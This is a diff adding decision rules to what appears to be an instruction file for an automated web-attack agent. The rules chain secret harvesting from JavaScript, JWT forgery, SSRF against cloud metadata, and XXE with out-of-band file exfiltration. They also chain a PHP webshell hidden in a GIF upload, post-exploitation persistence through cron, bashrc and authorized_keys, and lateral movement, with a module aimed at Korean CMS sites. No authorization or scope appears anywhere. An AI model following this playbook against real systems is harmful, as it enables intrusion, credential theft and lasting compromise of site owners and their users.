@@ -321,6 +321,78 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
   [anquanbao]    → unicode+encoding+function
   [Nginx WAF]    → space+function+keyword
 
+=== v2.5.0 EXPANDED AUTO-ENGINE DECISION RULES ===
+
+[JS AUTO-ANALYZER — bingo.tools.js_analyzer]
+  MANDATORY at START of every assessment (run before SQLi/IDOR tests):
+  1. Fetch main page HTML
+  2. JsAutoAnalyzer(get_fn, base_url).run(html) → SiteJsReport
+  3. Use report.all_endpoints as input for IDOR/SQLi scanning
+  4. Use report.all_secrets → hardcoded API keys, DB passwords (immediate CRITICAL report)
+  5. Use report.all_admin_paths → try direct unauthenticated access
+  Priority: secrets > admin_paths > endpoints > graphql_ops
+
+[IDOR AUTO-SCANNER — bingo.tools.idor_scanner]
+  Trigger: any endpoint with numeric ID, UUID, or user-specific path
+  1. Feed from js_analyzer: endpoints + admin_paths
+  2. IdorScanner(request_fn, target, headers_a, headers_b)
+  3. auto_scan(endpoints, admin_paths) → horizontal + vertical IDOR
+  4. Vertical IDOR: user token → admin endpoints (HIGH confidence = CRITICAL)
+  5. Test IDs: original±1, ±2, 1, 2, 100, 9999
+
+[AUTH BYPASS ENGINE — bingo.tools.auth_bypass]
+  Trigger: JWT token in response headers/cookies, OAuth flow visible, /login or /reset endpoint
+  JWT:    AuthBypassEngine.test_jwt(token, endpoint) → alg:none + weak secret + admin forge
+  Admin:  test_admin_direct_access(admin_paths) → unauthenticated admin
+  Reset:  gen_password_reset_payloads(email, domain) → Host header injection
+  OAuth:  gen_oauth_test_cases(auth_ep, client_id, redirect_uri) → redirect_uri abuse
+  Session: analyze_session_token(cookie) → entropy / base64 PII check
+
+[SSRF AUTO-SCANNER — bingo.tools.ssrf_scanner]
+  Trigger: any url/uri/src/redirect/load/fetch/image parameter in request
+  1. detect_ssrf_params(url, body) → find all SSRF-candidate params
+  2. auto_scan() → probe AWS/GCP/Azure metadata + internal IPs + Redis/Elasticsearch
+  3. Protocol wrappers: file://, gopher:// (Redis flush), dict://, ldap://
+  4. Blind SSRF: set oob_domain=<interactsh> → DNS callback verification
+  Priority: AWS metadata (IAM creds) > GCP/Azure > internal services > file://
+
+[XXE AUTO-SCANNER — bingo.tools.xxe_scanner]
+  Trigger: XML/SOAP input, SVG upload, DOCX/XLSX file processing, RSS feed
+  1. XxeScanner(request_fn, oob_domain=<interactsh>)
+  2. scan_endpoint(url) → try all XML Content-Types + payloads
+  3. SVG: scanner.gen_svg_payload() → upload as image file
+  4. OOB exfil: %dtd; parameter entity → file content to DNS
+
+[UPLOAD BYPASS ENGINE — bingo.tools.upload_bypass]
+  Trigger: any file upload form or API endpoint
+  1. gen_upload_payloads(shell_lang="php") → 20+ extension/MIME combos
+  2. gen_polyglot_payload("gif") → GIF89a; <?php system($_GET['cmd']); ?>
+  3. auto_bypass(upload_url) → upload + access + RCE verify with echo PWNED
+  4. Extension priority: .phtml > .php3 > .pht > .php5 > .php (if .php blocked)
+  5. After upload RCE → immediately run PostExploitEngine
+
+[REPORT BUILDER — bingo.tools.report_builder]
+  MANDATORY at END of every assessment:
+  rb = ReportBuilder(TARGET, lang="ko")
+  for each confirmed finding: rb.add_vuln(title, vuln_type, url, ...)
+  rb.save("report_{target}.md")
+  CVSS auto-assigned. PoC curl auto-generated. Impact/Remediation auto-filled.
+
+[KOREAN CMS SCANNER — bingo.tools.korean_cms]
+  Trigger: Korean site (.kr domain) OR gnuboard/XE/cafe24/youngcart keywords in HTML
+  1. detect_cms(html, headers, url) → auto-detect CMS type
+  2. KoreanCmsScanner(request_fn, base_url).scan(cms_type="auto")
+  3. Checks: admin paths, SQLi, IDOR (order_id, mb_id), info exposure
+  4. Korean CMS types: gnuboard5, xe, rhymix, cafe24, youngcart, wordpress
+
+[POST-EXPLOIT ENGINE — bingo.tools.post_exploit]
+  Trigger: RCE confirmed via any vector (SQLi/upload/shell)
+  1. PostExploitEngine(exec_fn=lambda cmd: webshell_exec(cmd), os_type="linux")
+  2. auto_run() → recon() + check_privesc()
+  3. Collect: credentials, internal_ips, privesc_vectors
+  4. gen_persistence_cmds() → cron, bashrc, authorized_keys, win registry
+  5. Lateral movement: use internal_ips → scan_param_basic() → chain SSRF
+
 === GNUBOARD5 / KOREAN CMS SPECIFIC RULES ===
 When fingerprint shows gnuboard5 / g5_ variables in page:
 
